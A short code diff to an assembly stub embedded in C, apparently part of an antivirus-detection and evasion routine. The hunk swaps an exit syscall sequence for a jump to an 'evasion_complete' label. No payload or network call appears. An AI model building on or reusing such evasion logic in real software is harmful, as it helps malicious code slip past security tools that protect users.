@@ -279,9 +279,10 @@ static const char STUB_AV_DETECT[] =
 "lea rsi, [msg_clear]\n"
 "_SET edx, 7\n"
 "syscall\n"
-"add rsp, 4416\n"
-"mov rax, 60\n"
-"xor rdi, rdi\n"
+"jmp evasion_complete\n"
+//"add rsp, 4416\n"
+//"mov rax, 60\n"
+//"xor rdi, rdi\n"
 "syscall\n"
 
 "exit_error:\n"
